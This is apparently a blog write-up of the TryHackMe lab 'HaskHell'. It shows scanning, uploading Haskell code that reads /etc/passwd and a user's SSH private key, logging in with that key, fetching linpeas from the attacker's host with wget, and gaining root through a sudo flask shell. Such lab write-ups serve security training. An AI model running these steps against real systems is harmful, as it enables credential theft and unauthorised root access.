---
title: Tryhackme - HaskHell | EN
author: batmanly
date: 2022-05-30 10:10:00 +3
categories: [Writeup, TryHackme]
tags: [web, flask, haskell, tryhackme, writeup]
render_with_liquid: false
---

# Information

## Room

- **Name:** HaskHell
- **Profile:** [HaskHell](https://tryhackme.com/room/haskhell)
- **Difficulty:** Medium
- **Description**: Show your professor that his PhD isn't in security.

![[]](/assets/img/tryhackme/haskhell/haskell_logo.png)

## Overview

It's a nice room , that you can use haskell and read file inside server . Previlege escalation step was easy actually that you can access root so fast .

# Write-up

Let's start enumeration and see what we can gather.

## Network enumeration

`Port` and `service` scan with nmap:

```bash
nmap -T4 -sV -sS  -v -p- 10.10.238.6  -sC -oN HaskHell
```

`Output:`

```

# Nmap 7.92 scan initiated Mon May 30 09:26:16 2022 as: nmap -n -Pn -T4 -sV -sS -v -p- -sC -oN HaskHell 10.10.238.6
Nmap scan report for 10.10.238.6
Host is up (0.084s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)
|   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)
|_  256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)
5001/tcp open  http    Gunicorn 19.7.1
|_http-title: Homepage
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: gunicorn/19.7.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

it's look we just have ssh and http open with different port , let's go and enumerate http port.

## Web enumeration

Discovering `directories` and `files` with go buster.

```
gobuster dir -u http://10.10.238.6:5001/ -w $BIG -t 50

```

Let's enumerate files and folders then:

```
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.238.6:5001/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /home/batmanly/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/30 09:31:01 Starting gobuster in directory enumeration mode
===============================================================
/submit               (Status: 200) [Size: 237]

===============================================================
2022/05/30 09:32:11 Finished
===============================================================
```

![[]](/assets/img/tryhackme/haskhell/Pasted%20image%2020220530093249.png)
We found submit directory let's go and see what's there. we realized that server is waiting our haskell file for compile and return result.
we can try to upload haskhell file and try to read file or get reverse shell , i tried get reverse shell but server givin 500 message , so after time i tried reading files it's look we have permission to read file, so lets' get to work and first read /etc/passwd and see what user we can enumerate than we will read this user ssh private key for connect to server with ssh . We can use burpsuite for that we can manipulate easily request and response.

```
http://10.10.238.6:5001/submit

```

upload this file , read_file.hs .

```haskell
import System.Process
main = do
   let file_to_read = "/etc/passwd"
   contents <- readFile file_to_read
   putStrLn contents

```

after upload file we can read passwd.
![[]](/assets/img/tryhackme/haskhell/Pasted%20image%2020220530095710.png)
let's go and read user's id_rsa file. we can enumeate user after start 1000 for this file.
i found that we can read prof id_rsa file .
change read_file.hs to read '/home/prof/.ssh/id_rsa' and get ssh private key.
![[]](/assets/img/tryhackme/haskhell/Pasted%20image%2020220530095913.png)

## Web exploitation

let's use this ssh private key to connect server.

```bash
chmod 600 haskhell
ssh prof@10.10.238.6 -i haskhell
```

![[]](/assets/img/tryhackme/haskhell/Pasted%20image%2020220530100047.png)

## Previlege Escalation

let's upload [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) and look if we can get any previlege escalation point to root or other user.

```bash
# Run Python Server
python3 -m http.server 80

# Get Linpeas
wget http://10.8.199.191/linpeas.sh

# Run Linpeas
chmod +x linpeas.sh
./linpeas.sh

```

we found that we can run flask with sudo without password , so let's get root shell from there.
![[]](/assets/img/tryhackme/haskhell/Pasted%20image%2020220530101111.png)

```bash
echo 'import pty;pty.spawn("/bin/bash")' > shell.py
export FLASK_APP=shell.py
sudo /usr/bin/flask run
```

![[]](/assets/img/tryhackme/haskhell/Pasted%20image%2020220530101354.png)

![[]](/assets/img/tryhackme/haskhell/root.gif)

Yep. Now we Got root.
Thanks for reading until the end , if you have any feedback i will appreciate to get , knowing different ways to get root always good for me.
